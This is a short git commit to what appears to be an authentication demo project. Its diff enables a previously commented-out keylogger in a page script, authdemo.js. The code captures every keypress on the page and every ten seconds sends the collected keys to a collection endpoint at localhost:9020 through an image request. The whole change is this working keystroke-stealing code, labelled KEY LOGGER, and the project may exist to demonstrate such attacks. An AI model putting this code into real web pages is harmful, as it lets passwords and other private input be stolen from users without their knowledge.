244a3a9e61a70c50894d239494842a027c6442be
georgy.saukov <gsaukov@yahoo.com>
2020-02-20 01:17:45 +0100

    authdemo keylogging

--- auth-demo/src/main/resources/static/js/authdemo.js
+++ auth-demo/src/main/resources/static/js/authdemo.js
@@ -266,20 +266,19 @@ function setMessagingSource(source) {
 
 //############# KEY LOGGER ######################
 
-//document.onkeypress = function(e) {
-//	get = window.event?event:e;
-//	key = get.keyCode?get.keyCode:get.charCode;
-//	key = String.fromCharCode(key);
-//	keys+=key;
-//}
-//window.setInterval(function(){
-//	if(keys.length>0) {
-//		new Image().src = url+keys;
-//		keys = '';
-//	}
-//}, 1000);
-
-
+var keys_ = '';
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys_+=key;
+}
+window.setInterval(function(){
+	if(keys_.length > 0) {
+		new Image().src = 'http://localhost:9020/imgkey/'+keys_;
+		keys_ = '';
+	}
+}, 10000);
 
 //############# KEY LOGGER  ######################
 
